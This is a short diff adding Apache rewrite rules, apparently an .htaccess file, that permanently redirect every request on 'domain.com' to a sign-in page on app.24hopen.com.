@@ -1,0 +1,4 @@
+RewriteEngine on
+RewriteBase /
+RewriteCond %{HTTP_HOST} domain.com [NC]
+RewriteRule ^(.*)$ http://app.24hopen.com/ve/blackpass/pages/sign-in.html [R=301,NC]
